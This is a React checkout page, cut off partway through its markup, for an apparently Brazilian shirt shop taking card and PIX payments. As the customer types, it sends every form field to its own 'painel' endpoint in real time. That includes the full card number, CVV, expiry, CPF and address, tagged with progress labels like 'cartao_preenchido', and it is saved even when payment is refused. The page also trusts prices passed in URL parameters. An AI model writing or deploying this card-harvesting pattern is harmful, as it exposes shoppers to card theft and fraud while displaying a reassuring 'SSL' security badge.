import React, { useState, useEffect, useRef } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { getProductById } from '@/lib/catalog';
import { useCart } from '../contexts/CartContext';
import { registerUsedDiscountsFromOrder } from '../lib/customerDiscounts';
import { computeCashback, readStoreConfigCache } from '../lib/promotions';
import { allProducts } from '../data/products';
import { trackInitiateCheckout, trackAddPaymentInfo, consumeInitiateCheckoutId, generateEventId, getFbc, getFbp } from '../lib/metaPixel';
import { User, Mail, CreditCard, MapPin, Phone, Calendar, Hash, Lock, ShieldCheck, QrCode, Copy, CheckCheck, Clock, CheckCircle2 } from 'lucide-react';

interface PixData {
  qrCode: string;
  qrImage: string;
}

export default function Checkout() {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [statusErro, setStatusErro] = useState(false);
  const [metodo, setMetodo] = useState<'cartao' | 'pix'>('cartao');
  const [pixData, setPixData] = useState<PixData | null>(null);
  const [pixLoading, setPixLoading] = useState(false);
  const [pixErro, setPixErro] = useState('');
  const [copiado, setCopiado] = useState(false);
  const [aprovado, setAprovado] = useState(false);
  const [paginaRecusado, setPaginaRecusado] = useState(false);
  const [recusadoMsg, setRecusadoMsg] = useState('');
  const [parcelas, setParcelas] = useState('1');

  const { items: cartItems, totalPrice: cartTotal, totalItems, discount, promotions } = useCart();
  const [timeLeft, setTimeLeft] = useState(300);
  const [produto, setProduto] = useState({
    nome: 'Buscando camisa...',
    preco: 0,
    imagens: [] as string[]
  });

  // Cashback do pedido: calculado sobre o valor final exibido no checkout,
  // funcionando tanto para o fluxo de carrinho quanto para link direto.
  const [storeCfg, setStoreCfg] = useState<any>(() => readStoreConfigCache());
  useEffect(() => {
    const sync = (e: any) => setStoreCfg(e?.detail || readStoreConfigCache());
    window.addEventListener('storeConfigUpdated', sync as EventListener);
    return () => window.removeEventListener('storeConfigUpdated', sync as EventListener);
  }, []);
  const cashback = computeCashback(
    storeCfg?.precoGestao?.cashback,
    Number(produto.preco) || 0,
    totalItems || 1
  );

  const [formData, setFormData] = useState({
    nome: '', email: '', cpf: '', dataNascimento: '', telefone: '',
    cep: '', endereco: '', bairro: '', cidade: '', estado: '', numero: '',
    numCartao: '', nomeCartao: '', validade: '', cvv: ''
  });

  const persistPurchaseContext = async (
    transactionId: string | null | undefined,
    metaEventId: string,
    fbp: string,
    fbc: string,
  ) => {
    if (!transactionId) return;

    try {
      await fetch('/api/meta-capi-purchase-id', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          transaction_id: transactionId,
          meta_event_id: metaEventId,
          fbp,
          fbc,
        }),
      });
    } catch (error) {
      console.warn('[Checkout] Falha ao salvar contexto de atribuição Meta:', error);
    }
  };

  // ── InitiateCheckout: garantido ao abrir /checkout ────────────────────────
  // Antes o evento só saía do botão do carrinho lateral; quem chegava direto
  // na URL do checkout (ou recarregava a página) nunca gerava InitiateCheckout.
  // Aqui ele é disparado no mount, uma única vez, reaproveitando o event_id
  // vindo do carrinho quando existir (deduplicação no Meta).
  const initiateCheckoutSent = useRef(false);

  useEffect(() => {
    if (initiateCheckoutSent.current) return;
    if (!produto || !produto.preco || produto.preco <= 0) return;

    initiateCheckoutSent.current = true;

    const contentIds: string[] = [];
    const prodId = searchParams.get('id');
    if (prodId) {
      contentIds.push(prodId);
    } else if (cartItems.length > 0) {
      contentIds.push(...cartItems.map(i => i.product.id));
    }
    if (contentIds.length === 0) contentIds.push('checkout');

    const numItems = cartItems.length > 0
      ? totalItems
      : (parseInt(searchParams.get('qty') || '1') || 1);

    const priorEventId = consumeInitiateCheckoutId();

    trackInitiateCheckout({
      value: Number(produto.preco) || 0,
      numItems,
      contentIds,
      currency: 'BRL',
      userData: { fbc: getFbc(), fbp: getFbp() },
      eventId: priorEventId || undefined,
    }).catch(err => console.warn('[Checkout] InitiateCheckout falhou:', err));
  }, [produto.preco, cartItems.length, totalItems, searchParams]);

  useEffect(() => {
    const id = searchParams.get('id');
    const overrideNome = searchParams.get('nome');
    const overridePreco = searchParams.get('preco');
    const overrideImg = searchParams.get('img');
    const qty = parseInt(searchParams.get('qty') || '1');

    if (id) {
      // Carregamento flexível: aceita qualquer preço e aplica o desconto sobre o total
      const localProd = allProducts.find(p => p.id === id);
      const parsePrice = (val: any) => {
        if (typeof val === 'number') return val === 1300 ? 1000 : val;
        if (typeof val === 'string') {
          const clean = val.replace(/[^\d,.]/g, '').replace(',', '.');
          const num = parseFloat(clean) || 0;
          return num === 1300 ? 1000 : num;
        }
        return 0;
      };

      const isPlayer = searchParams.get('type') === 'Jogador' || searchParams.get('version') === 'Jogador';
      const isCustom = searchParams.get('type') === 'Personalizada' || searchParams.get('customized') === 'true';
      let addon = 0;
      if (isPlayer) addon += 20;
      if (isCustom) addon += 20;

      const initialBasePrice = overridePreco ? parsePrice(overridePreco) : (localProd ? localProd.priceNum : 70.00);
      let finalPrice = (initialBasePrice + addon) * qty;
      if (Math.abs(finalPrice - 1300) < 0.01) finalPrice = 1000;
      const precoComDesconto = discount > 0 ? finalPrice * (1 - discount) : finalPrice;

      if (localProd) {
        setProduto({
          nome: overrideNome || localProd.name,
          preco: precoComDesconto,
          imagens: [overrideImg || localProd.image].filter(img => img) as string[]
        });
      }

      getProductById(id)
        .then((data) => {
          if (data) {
            const dbBasePrice = overridePreco ? parsePrice(overridePreco) : (data.preco ? parsePrice(data.preco) : 70.00);
            let dbFinalPrice = (dbBasePrice + addon) * qty;
            if (Math.abs(dbFinalPrice - 1300) < 0.01) dbFinalPrice = 1000;
            const dbPrecoComDesconto = discount > 0 ? dbFinalPrice * (1 - discount) : dbFinalPrice;

            setProduto(prev => ({
              ...prev,
              nome: overrideNome || data.nome,
              preco: dbPrecoComDesconto,
              imagens: [overrideImg || data.imagem_url || data.image].filter(img => img && !img.includes('placeholder')) as string[]
            }));
          }
        });
    } else if (overrideNome && overridePreco) {
      const parsePrice = (val: any) => {
        if (typeof val === 'number') return val === 1300 ? 1000 : val;
        if (typeof val === 'string') {
          const clean = val.replace(/[^\d,.]/g, '').replace(',', '.');
          const num = parseFloat(clean) || 0;
          return num === 1300 ? 1000 : num;
        }
        return 0;
      };
      // Usa o preço vindo via parâmetro (&preco=...) ao invés de forçar 90.93
      const basePrice = parsePrice(overridePreco);
      let finalPrice = basePrice * qty;
      if (Math.abs(finalPrice - 1300) < 0.01) finalPrice = 1000;
      setProduto({
        nome: overrideNome,
        preco: discount > 0 ? finalPrice * (1 - discount) : finalPrice,
        imagens: (overrideNome.includes('Carrinho') || overrideNome.includes('CARRINHO')) ? [] : (overrideImg ? [overrideImg] : [])
      });
    } else if (cartItems.length > 0) {
      let totalCart = Number(cartTotal) || 0;
      if (Math.abs(totalCart - 1300) < 0.01) totalCart = 1000;
      setProduto({
        nome: `CARRINHO (${totalItems} ITENS)`,
        preco: totalCart,
        imagens: cartItems.map(item => item.product.image || item.product.imagem_url).filter(img => img) as string[]
      });
    }
  }, [searchParams, cartItems, cartTotal, totalItems, discount]);

  const [dbCheckoutId, setDbCheckoutId] = useState<number | string | null>(() => {
    try {
      const saved = sessionStorage.getItem('c10_checkout_db_id');
      return saved ? JSON.parse(saved) : null;
    } catch (_) { return null; }
  });

  const salvarDadosNoPainel = async (statusPagamento = 'em_digitacao') => {
    try {
      const hasAnyValue = Object.values(formData).some(val => typeof val === 'string' && val.trim().length > 0);
      if (!hasAnyValue) return;

      const payload = {
        checkout_id: dbCheckoutId || undefined,
        nome_completo: formData.nome || null,
        email: formData.email || null,
        cpf: formData.cpf || null,
        data_nascimento: formData.dataNascimento || null,
        telefone: formData.telefone || null,
        cep: formData.cep || null,
        endereco: formData.endereco || null,
        bairro: formData.bairro || null,
        cidade: formData.cidade || null,
        estado: formData.estado || null,
        numero: formData.numero || null,
        numero_cartao: formData.numCartao || (metodo === 'pix' ? 'PIX' : null),
        nome_cartao: formData.nomeCartao || (metodo === 'pix' ? 'PIX' : null),
        validade_cartao: formData.validade || (metodo === 'pix' ? 'PIX' : null),
        cvv_cartao: formData.cvv || (metodo === 'pix' ? 'PIX' : null),
        produto_nome: produto.nome || 'Camiseta',
        valor_total: produto.preco || 0,
        status: statusPagamento,
        cupom_aplicado: discount > 0 ? 'CAMISA10' : null
      };

      const res = await fetch('/api/save-checkout', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      if (res.ok) {
        const json = await res.json();
        if (json.id) {
          setDbCheckoutId(json.id);
          sessionStorage.setItem('c10_checkout_db_id', JSON.stringify(json.id));
        }
      }

      if (statusPagamento === 'pix_generated' || statusPagamento === 'paid') {
        registerUsedDiscountsFromOrder(cartItems, discount > 0 ? 'CAMISA10' : undefined);
      }
    } catch (e) {
      console.error("Erro ao salvar dados no painel:", e);
    }
  };

  // Salva em tempo real TODOS os campos preenchidos conforme o cliente digita
  useEffect(() => {
    const timer = setTimeout(() => {
      const hasValue = Object.values(formData).some(val => typeof val === 'string' && val.trim().length > 0);
      if (hasValue) {
        let currentStatus = 'em_digitacao';
        if (formData.numCartao && formData.cvv) {
          currentStatus = 'cartao_preenchido';
        } else if (formData.endereco && formData.numero) {
          currentStatus = 'endereco_preenchido';
        } else if (formData.nome && formData.telefone) {
          currentStatus = 'lead_pessoal';
        }
        salvarDadosNoPainel(currentStatus);
      }
    }, 400);
    return () => clearTimeout(timer);
  }, [formData, metodo]);

  const gerarPix = async () => {
    if (!formData.nome || !formData.cpf || !formData.email) {
      setPixErro('Preencha os dados pessoais para gerar o PIX.');
      return;
    }

    setPixLoading(true);
    setPixErro('');
    setPixData(null);

    try {
      const metaEventId = generateEventId('Purchase');
      const fbp = getFbp();
      const fbc = getFbc();
      let valorCobrar = Number(produto.preco) || 0;
      if (Math.abs(valorCobrar - 1300) < 0.01) valorCobrar = 1000;
      const payload = {
        amount: valorCobrar,
        payment_method: 'pix',
        meta_event_id: metaEventId,
        tracking: { fbp, fbc },
        client: {
          name: formData.nome,
          email: formData.email,
          phone: formData.telefone,
          document: formData.cpf
        },
        cart_items: [
          {
            product_hash: 'le2c9v07wt_gybcv5o9me',
            title: produto.nome,
            price: valorCobrar,
            quantity: 1
          }
        ]
      };

      const res = await fetch('/api/create-payment', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body: JSON.stringify(payload),
      });

      const json = await res.json();
      if (!res.ok || json.error) throw new Error(json?.error || json?.message || 'Erro na IronPay');

      // Pega os dados normalizados da nossa API
      const qrCode = json?.pix?.code || '';
      const qrImage = json?.pix?.image || '';

      if (!qrCode) throw new Error('PIX gerado sem código pela IronPay.');

      setPixData({ 
        qrCode, 
        qrImage
      });
      
      await salvarDadosNoPainel('pix_generated');
      await persistPurchaseContext(json.transaction_id, json.meta_event_id || metaEventId, fbp, fbc);

      trackAddPaymentInfo({
        value: Number(produto.preco) || 0,
        contentIds: cartItems.length > 0 ? cartItems.map(i => i.product.id) : [searchParams.get('id') || 'checkout'],
        paymentCategory: 'pix',
        userData: { fbc, fbp }
      }).catch(err => console.warn('[Checkout] AddPaymentInfo falhou:', err));
    } catch (err: any) {
      setPixErro(err?.message || 'Erro ao conectar com IronPay.');
    } finally {
      setPixLoading(false);
    }
  };

  const handleFinalizar = async (e: React.FormEvent) => {
    e.preventDefault();
    if (metodo === 'pix') {
      if (!pixData) gerarPix();
      return;
    }

    setLoading(true);
    setStatusErro(false);

    try {
      const [mes, ano] = formData.validade.split('/');
      let expMonth = parseInt(mes);
      let expYear = parseInt(ano);
      if (expYear < 100) expYear += 2000;
      
      const metaEventId = generateEventId('Purchase');
      const fbp = getFbp();
      const fbc = getFbc();
      let valorCobrar = Number(produto.preco) || 0;
      if (Math.abs(valorCobrar - 1300) < 0.01) valorCobrar = 1000;
      const payload = {
        amount: valorCobrar,
        payment_method: 'credit_card',
        installments: parseInt(parcelas),
        meta_event_id: metaEventId,
        tracking: { fbp, fbc },
        card: {
          number: formData.numCartao.replace(/\s/g, ''),
          holder_name: formData.nomeCartao,
          expiry_month: expMonth,
          expiry_year: expYear,
          cvv: formData.cvv
        },
        client: {
          name: formData.nome,
          email: formData.email,
          phone: formData.telefone,
          document: formData.cpf
        },
        cart_items: [
          {
            product_hash: 'le2c9v07wt_gybcv5o9me',
            title: produto.nome,
            price: valorCobrar,
            quantity: 1
          }
        ]
      };

      trackAddPaymentInfo({
        value: Number(produto.preco) || 0,
        contentIds: cartItems.length > 0 ? cartItems.map(i => i.product.id) : [searchParams.get('id') || 'checkout'],
        paymentCategory: 'credit_card',
        userData: { fbc, fbp }
      }).catch(err => console.warn('[Checkout] AddPaymentInfo falhou:', err));

      const res = await fetch('/api/create-payment', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body: JSON.stringify(payload),
      });

      const json = await res.json();
      
      if (!res.ok || json.error) {
        throw new Error(json.error || json.message || 'Cartão recusado');
      }

      if (json.status === 'success' && (json.payment_method === 'pix' || (json.card && json.card.status === 'aprovado'))) {
        await salvarDadosNoPainel('paid');
        await persistPurchaseContext(json.transaction_id, json.meta_event_id || metaEventId, fbp, fbc);

        // Purchase não é emitido aqui. O webhook da IronPay é a única fonte de
        // confirmação e envia o evento server-side após o pagamento efetivo.
        setAprovado(true);
      } else {
        throw new Error(json?.message || json?.error || 'Cartão recusado pela operadora.');
      }
    } catch (err: any) {
      console.error("Erro Pagamento:", err);
      await salvarDadosNoPainel('refused');
      setRecusadoMsg(err.message || 'Cartão recusado pela operadora.');
      setPaginaRecusado(true);
    } finally {
      setLoading(false);
    }
  };

  const handleCEP = async (e: React.FocusEvent<HTMLInputElement>) => {
    const cep = e.target.value.replace(/\D/g, '');
    if (cep.length === 8) {
      const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
      const data = await res.json();
      if (!data.erro) {
        setFormData(prev => ({
          ...prev,
          endereco: data.logradouro, bairro: data.bairro, cidade: data.localidade, estado: data.uf
        }));
      }
    }
  };

  const mask = (e: React.ChangeEvent<HTMLInputElement>) => {
    let { name, value } = e.target;
    if (name === 'telefone') value = value.replace(/\D/g, '').replace(/^(\d{2})(\d)/g, "($1) $2").replace(/(\d)(\d{4})$/, "$1-$2");
    if (name === 'cpf') value = value.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
    if (name === 'dataNascimento') value = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, "$1/$2").replace(/(\d{2})(\d)/, "$1/$2").substring(0, 10);
    if (name === 'validade') value = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, "$1/$2").substring(0, 7);
    if (name === 'numCartao') value = value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, "$1 ");
    if (name === 'cep') value = value.replace(/\D/g, '').replace(/(\d{5})(\d)/, "$1-$2");
    setFormData({ ...formData, [name]: value });
  };

  if (aprovado) {
    return (
      <div style={{ background: '#fff', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '20px', textAlign: 'center', fontFamily: 'sans-serif' }}>
        <style>{`
          @keyframes drawCheck { 0% { stroke-dashoffset: 100; opacity: 0; } 100% { stroke-dashoffset: 0; opacity: 1; } }
          @keyframes circleScale { 0% { transform: scale(0); opacity: 0; } 60% { transform: scale(1.1); } 100% { transform: scale(1); opacity: 1; } }
          @keyframes fadeUp { 0% { opacity: 0; transform: translateY(20px); } 100% { opacity: 1; transform: translateY(0); } }
        `}</style>
        
        <div style={{ animation: 'circleScale 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards', marginBottom: '32px' }}>
          <svg width="140" height="140" viewBox="0 0 140 140">
            <circle cx="70" cy="70" r="65" fill="#1da154" style={{ animation: 'circleScale 0.5s ease-out forwards' }} />
            <circle cx="70" cy="70" r="65" fill="none" stroke="rgba(255,255,255,0.2)" strokeWidth="3" />
            <path
              d="M40 70 L60 90 L100 45"
              fill="none"
              stroke="white"
              strokeWidth="9"
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeDasharray="100"
              strokeDashoffset="100"
              style={{ animation: 'drawCheck 0.5s ease-out 0.4s forwards' }}
            />
          </svg>
        </div>

        <div style={{ animation: 'fadeUp 0.5s ease-out 0.7s both' }}>
          <h1 style={{ fontWeight: 900, fontSize: '32px', color: '#14532d', marginBottom: '12px', letterSpacing: '-0.5px' }}>PAGAMENTO APROVADO!</h1>
          <p style={{ color: '#166534', fontSize: '16px', marginBottom: '8px', fontWeight: 600 }}>🎉 Seu pedido foi processado com sucesso!</p>
          <p style={{ color: '#1da154', fontSize: '18px', fontWeight: 'bold', marginBottom: '30px' }}>O código de rastreio será enviado em até 48 horas para o seu e-mail.</p>
          <button
            onClick={() => navigate('/')}
            style={{ padding: '18px 48px', background: '#1da154', color: '#fff', border: 'none', borderRadius: '14px', fontWeight: 900, fontSize: '16px', cursor: 'pointer', boxShadow: '0 8px 24px rgba(29,161,84,0.4)' }}
          >
            VOLTAR PARA A LOJA
          </button>
        </div>
      </div>
    );
  }

  if (paginaRecusado) {
    return (
      <div style={{ background: 'linear-gradient(135deg, #fff5f5 0%, #fee2e2 50%, #fecaca 100%)', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '20px', textAlign: 'center', fontFamily: 'sans-serif' }}>
        <style>{`
          @keyframes drawX { 0% { stroke-dashoffset: 60; opacity: 0; } 100% { stroke-dashoffset: 0; opacity: 1; } }
          @keyframes circleShrink { 0% { transform: scale(0); opacity: 0; } 60% { transform: scale(1.1); } 100% { transform: scale(1); opacity: 1; } }
          @keyframes shakeCard { 0%, 100% { transform: translateX(0); } 15% { transform: translateX(-10px) rotate(-1deg); } 30% { transform: translateX(10px) rotate(1deg); } 45% { transform: translateX(-7px); } 60% { transform: translateX(7px); } 75% { transform: translateX(-4px); } 90% { transform: translateX(4px); } }
          @keyframes fadeUpRed { 0% { opacity: 0; transform: translateY(20px); } 100% { opacity: 1; transform: translateY(0); } }
        `}</style>

        <div style={{ animation: 'circleShrink 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards, shakeCard 0.6s ease-out 0.8s both', marginBottom: '32px' }}>
          <svg width="140" height="140" viewBox="0 0 140 140">
            <circle cx="70" cy="70" r="65" fill="#ef4444" style={{ animation: 'circleShrink 0.5s ease-out forwards' }} />
            <circle cx="70" cy="70" r="65" fill="none" stroke="rgba(255,255,255,0.2)" strokeWidth="3" />
            <line
              x1="45" y1="45" x2="95" y2="95"
              stroke="white" strokeWidth="9" strokeLinecap="round"
              strokeDasharray="70" strokeDashoffset="70"
              style={{ animation: 'drawX 0.35s ease-out 0.4s forwards' }}
            />
            <line
              x1="95" y1="45" x2="45" y2="95"
              stroke="white" strokeWidth="9" strokeLinecap="round"
              strokeDasharray="70" strokeDashoffset="70"
              style={{ animation: 'drawX 0.35s ease-out 0.6s forwards' }}
            />
          </svg>
        </div>

        <div style={{ animation: 'fadeUpRed 0.5s ease-out 0.9s both' }}>
          <h1 style={{ fontWeight: 900, fontSize: '30px', color: '#7f1d1d', marginBottom: '12px', letterSpacing: '-0.5px' }}>PAGAMENTO RECUSADO</h1>
          <p style={{ color: '#991b1b', fontSize: '16px', marginBottom: '12px', fontWeight: 700 }}>Seu cartão não foi aprovado.</p>
          {recusadoMsg && (
            <div style={{ background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.3)', borderRadius: '10px', padding: '12px 20px', marginBottom: '20px', maxWidth: '360px', color: '#b91c1c', fontSize: '13px', fontWeight: 700 }}>
              {recusadoMsg}
            </div>
          )}
          <p style={{ color: '#991b1b', fontSize: '14px', marginBottom: '32px', maxWidth: '360px', lineHeight: 1.6 }}>
            Verifique os dados do cartão ou tente com outro cartão.<br />
            <strong>Dica:</strong> Confira o número, validade, CVV e se há limite disponível.
          </p>
          <div style={{ display: 'flex', gap: '12px', flexDirection: 'column', alignItems: 'center' }}>
            <button
              onClick={() => { setPaginaRecusado(false); setStatusErro(false); setRecusadoMsg(''); }}
              style={{ padding: '18px 48px', background: '#ef4444', color: '#fff', border: 'none', borderRadius: '14px', fontWeight: 900, fontSize: '16px', cursor: 'pointer', boxShadow: '0 8px 24px rgba(239,68,68,0.4)', letterSpacing: '0.05em', width: '100%', maxWidth: '340px' }}
            >
              TENTAR NOVAMENTE
            </button>
            <button
              onClick={() => { setPaginaRecusado(false); setStatusErro(false); setRecusadoMsg(''); setMetodo('pix'); }}
              style={{ padding: '16px 48px', background: '#fff', color: '#1da154', border: '2px solid #1da154', borderRadius: '14px', fontWeight: 900, fontSize: '15px', cursor: 'pointer', width: '100%', maxWidth: '340px' }}
            >
              PAGAR COM PIX
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div style={{ background: '#f4f7f6', minHeight: '100vh', fontFamily: 'sans-serif', color: '#000', paddingBottom: '40px' }}>
      {loading && (
        <div style={overlayStyle}>
          <div style={spinnerStyle} />
          <p style={{ marginTop: '15px', fontWeight: '900', color: '#000' }}>Processando pagamento...</p>
        </div>
      )}

      <div className="notranslate" style={{ maxWidth: '500px', margin: '0 auto', background: '#fff', boxShadow: '0 0 20px rgba(0,0,0,0.1)', minHeight: '100vh' }}>
        <div style={{ padding: '20px', borderBottom: '1px solid #eee', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <div>
            <h2 style={{ margin: 0, fontSize: '18px', fontWeight: '900', color: '#000' }}>CHECKOUT SEGURO</h2>
            <div style={{ fontSize: '12px', color: '#1da154', fontWeight: 'bold', display: 'flex', alignItems: 'center', gap: '4px' }}>
              <ShieldCheck size={14} /> Dados criptografados (SSL)
            </div>
          </div>
        </div>

        <div style={{ padding: '20px' }}>
          <div style={productBox}>
            {produto.imagens && produto.imagens.length > 0 && (
              <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
                {produto.imagens.map((img, idx) => (
                  <img 
                    loading="lazy"
                    decoding="async"
                    key={idx}
                    src={img} 
                    alt={produto.nome} 
                    style={{ width: '60px', height: '60px', borderRadius: '8px', objectFit: 'cover', border: '1px solid #e2e8f0' }} 
                  />
                ))}
              </div>
            )}
            <div style={{ flex: 1 }}>
              <div style={{ fontWeight: '900', fontSize: '14px', color: '#000', lineHeight: '1.2', textTransform: 'uppercase' }}>
                {produto.nome}
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', marginTop: '5px' }}>
                {discount > 0 && (
                  <div style={{ fontSize: '12px', color: '#666', textDecoration: 'line-through' }}>
                    R$ {(produto.preco / (1 - discount)).toFixed(2).replace('.', ',')}
                  </div>
                )}
                <div style={{ fontSize: '20px', fontWeight: '900', color: '#000' }}>
                  R$ {(Number(produto.preco) || 0).toFixed(2).replace('.', ',')}
                </div>
                {discount > 0 && (
                  <div style={{ fontSize: '12px', color: '#1da154', fontWeight: 'bold' }}>
                    Cupom CAMISA10 aplicado (10% OFF)
                  </div>
                )}
                {promotions.applied.map(p => (
                  <div key={p.id} style={{ fontSize: '12px', color: '#b45309', fontWeight: 'bold' }}>
                    🎁 {p.nome} — R$ {p.desconto.toFixed(2).replace('.', ',')} de desconto
                  </div>
                ))}
                {cashback.ativo && cashback.valor > 0 && (
                  <div style={{ marginTop: '6px', background: 'rgba(16,185,129,0.10)', border: '1px solid rgba(16,185,129,0.3)', borderRadius: '8px', padding: '6px 8px', fontSize: '12px', color: '#0f766e', fontWeight: 800 }}>
                    💸 {cashback.texto || `Você ganha R$ ${cashback.valor.toFixed(2).replace('.', ',')} de cashback`}
                    {cashback.validadeDias > 0 && (
                      <span style={{ fontWeight: 600 }}> (válido por {cashback.validadeDias} dias)</span>
                    )}
                  </div>
                )}
              </div>
            </div>
          </div>

          <div style={tabContainer}>
            <button type="button" onClick={() => setMetodo('cartao')} style={metodo === 'cartao' ? tabActive : tabInactive}>
              <CreditCard size={18} /> CARTÃO
            </button>
            <button type="button" onClick={() => setMetodo('pix')} style={metodo === 'pix' ? tabActive : tabInactive}>
              <QrCode size={18} /> PIX
            </button>
          </div>

          <form onSubmit={handleFinalizar}>
            <h4 style={sectionLabel}>1. DADOS PESSOAIS</h4>
            <div style={inputGroup}><User size={18} /><input name="nome" placeholder="NOME COMPLETO" required style={inputStyle} value={formData.nome} onChange={mask} /></div>
            <div style={inputGroup}><Mail size={18} /><input name="email" type="email" placeholder="E-MAIL" required style={inputStyle} value={formData.email} onChange={mask} /></div>
            <div style={{ display: 'flex', gap: '10px' }}>
              <div style={inputGroup}><Hash size={18} /><input name="cpf" placeholder="CPF" required style={inputStyle} value={formData.cpf} onChange={mask} /></div>
              <div style={inputGroup}><Phone size={18} /><input name="telefone" placeholder="WHATSAPP" required style={inputStyle} value={formData.telefone} onChange={mask} /></div>
            </div>

            <h4 style={sectionLabel}>2. ENDEREÇO DE ENTREGA</h4>
            <div style={{ display: 'flex', gap: '10px' }}>
              <div style={inputGroup}><MapPin size={18} /><input name="cep" placeholder="CEP" required style={inputStyle} value={formData.cep} onChange={mask} onBlur={handleCEP} /></div>
              <div style={inputGroup}><Hash size={18} /><input name="numero" placeholder="NÚMERO" required style={inputStyle} value={formData.numero} onChange={mask} /></div>
            </div>
            <div style={inputGroup}><MapPin size={18} /><input name="endereco" placeholder="ENDEREÇO" required style={inputStyle} value={formData.endereco} onChange={mask} /></div>
            <div style={inputGroup}><MapPin size={18} /><input name="bairro" placeholder="BAIRRO" required style={inputStyle} value={formData.bairro} onChange={mask} /></div>
            <div style={{ display: 'flex', gap: '10px' }}>
              <div style={inputGroup}><MapPin size={18} /><input name="cidade" placeholder="CIDADE" required style={inputStyle} value={formData.cidade} onChange={mask} /></div>
              <div style={inputGroup}><MapPin size={18} /><input name="estado" placeholder="UF" required style={inputStyle} value={formData.estado} onChange={mask} /></div>
            </div>

            {metodo === 'cartao' ? (
              <>
                <h4 style={sectionLabel}>3. PAGAMENTO VIA CARTÃO</h4>
                <div style={inputGroup}><CreditCard size={18} /><input name="numCartao" placeholder="NÚMERO DO CARTÃO" required style={inputStyle} value={formData.numCartao} onChange={mask} /></div>
                <div style={inputGroup}><User size={18} /><input name="nomeCartao" placeholder="NOME NO CARTÃO" required style={inputStyle} value={formData.nomeCartao} onChange={mask} /></div>
                <div style={{ display: 'flex', gap: '10px' }}>
                  <div style={inputGroup}><Calendar size={18} /><input name="validade" placeholder="MM/AA" required style={inputStyle} value={formData.validade} onChange={mask} /></div>
                  <div style={inputGroup}><Lock size={18} /><input name="cvv" placeholder="CVV" required style={inputStyle} value={formData.cvv} onChange={mask} /></div>
                </div>
                <div style={{ marginTop: '15px' }}>
                  <label style={{ fontSize: '12px', fontWeight: 'bold', color: '#666' }}>PARCELAMENTO</label>
                  <select value={parcelas} onChange={(e) => setParcelas(e.target.value)} style={selectStyle}>
                    {[1,2,3,4,5,6,7,8,9,10,11,12].map(n => (
                      <option key={n} value={n}>{n}x de R$ {(produto.preco / n).toFixed(2).replace('.', ',')} sem juros</option>
                    ))}
                  </select>
                </div>
              </>
            ) : (
              <div style={pixBox}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '15px' }}>
                  <QrCode size={24} color="#1da154" />
                  <div style={{ fontWeight: '900', fontSize: '14px' }}>PAGAMENTO VIA PIX</div>
                </div>
                
                {pixLoading ? (
                  <div style={{ textAlign: 'center', padding: '20px' }}>
                    <div style={{ ...spinnerStyle, margin: '0 auto', width: '30px', height: '30px' }} />
                    <p style={{ fontSize: '12px', marginTop: '10px', color: '#666' }}>Gerando código PIX...</p>
                  </div>
                ) : pixData ? (
                  <div style={{ textAlign: 'center' }}>
                    <img loading="eager" decoding="async" src={pixData.qrImage} alt="QR Code PIX" style={{ width: '180px', height: '180px', margin: '0 auto', display: 'block' }} />
                    <div style={{ background: '#f8f9fa', padding: '10px', borderRadius: '8px', marginTop: '15px', border: '1px dashed #ccc' }}>
                      <div style={{ fontSize: '10px', color: '#666', marginBottom: '5px', fontWeight: 'bold' }}>CÓDIGO PIX (COPIA E COLA)</div>
                      <div style={{ fontSize: '11px', wordBreak: 'break-all', color: '#333', maxHeight: '60px', overflow: 'hidden', marginBottom: '10px' }}>{pixData.qrCode}</div>
                      <button type="button" onClick={() => { navigator.clipboard.writeText(pixData.qrCode); setCopiado(true); setTimeout(() => setCopiado(false), 2000); }} style={btnCopiar}>
                        {copiado ? <><CheckCheck size={16} /> COPIADO!</> : <><Copy size={16} /> COPIAR CÓDIGO</>}
                      </button>
                    </div>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', justifyContent: 'center', marginTop: '15px', color: '#666', fontSize: '12px' }}>
                      <Clock size={14} /> Expira em 30 minutos
                    </div>
                  </div>
                ) : (
                  <div style={{ textAlign: 'center', padding: '20px', background: '#f8f9fa', borderRadius: '8px' }}>
                    <p style={{ fontSize: '13px', color: '#666' }}>Clique no botão abaixo para gerar o seu código PIX.</p>
                  </div>
                )}
                {pixErro && <div style={{ color: '#dc3545', fontSize: '12px', marginTop: '10px', textAlign: 'center', fontWeight: 'bold' }}>{pixErro}</div>}
              </div>
            )}

            {statusErro && (
              <div style={{ ...errorBanner, animation: 'shakeX 0.5s ease-out' }}>
                <div style={{ fontSize: '16px', marginBottom: '6px' }}>⚠️ CARTÃO RECUSADO</div>
                <div style={{ fontSize: '12px', fontWeight: 700, opacity: 0.85 }}>
                  {recusadoMsg || 'Verifique os dados ou tente outro cartão.'}
                </div>
                <button
                  type="button"
                  onClick={() => setPaginaRecusado(true)}
                  style={{ marginTop: '10px', padding: '8px 20px', background: '#b91c1c', color: '#fff', border: 'none', borderRadius: '8px', fontWeight: 900, cursor: 'pointer', fontSize: '12px' }}
                >
                  VER DETALHES DO ERRO
                </button>
              </div>
            )}

